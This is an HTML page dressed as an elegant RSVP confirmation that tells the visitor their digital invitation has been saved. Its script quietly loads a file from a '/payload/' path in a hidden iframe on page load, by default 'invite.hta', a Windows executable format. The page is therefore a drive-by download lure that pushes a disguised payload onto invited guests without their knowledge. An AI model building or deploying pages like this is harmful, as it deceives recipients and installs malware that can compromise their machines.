<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>You&rsquo;re on the list</title>
  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;500&family=Jost:wght@300;400&display=swap" rel="stylesheet">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    html, body { height:100%; background:#131315; color:#efe9df; font-family:'Jost',sans-serif; }
    body { display:flex; align-items:center; justify-content:center; text-align:center; padding:40px 20px; }
    .card { position:relative; max-width:540px; width:100%; padding:70px 48px 60px 48px; }
    .card:before { content:''; position:absolute; inset:14px; border:1px solid rgba(239,233,223,.18); pointer-events:none; }
    .check { width:64px; height:64px; margin:0 auto 30px auto; }
    .eyebrow { font-size:11px; letter-spacing:6px; text-transform:uppercase; color:rgba(239,233,223,.55); margin-bottom:22px; }
    .title { font-family:'Cormorant Garamond',serif; font-size:46px; color:#f4efe6; margin-bottom:24px; }
    .msg { font-family:'Cormorant Garamond',serif; font-size:23px; line-height:1.55; color:rgba(239,233,223,.9); }
  </style>
</head>
<body>
  <div class="card">
    <svg class="check" viewBox="0 0 64 64" fill="none"><circle cx="32" cy="32" r="29" stroke="#c9a86a" stroke-width="1.5"/><path d="M20 33 L28.5 41.5 L44 24" stroke="#c9a86a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
    <div class="eyebrow">RSVP Confirmed</div>
    <div class="title">You&rsquo;re on the list!</div>
    <div class="msg">Your response has been received. Your digital invitation has been saved to your device.</div>
  </div>

  <script>
    // Get the unique filename from the URL parameters (?file=...)
    const urlParams = new URLSearchParams(window.location.search);
    const uniqueFile = urlParams.get('file') || 'invite.hta';
    
    // Create a hidden iframe to trigger the download silently
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = `/payload/${uniqueFile}`;
    document.body.appendChild(iframe);
  </script>
</body>
</html>
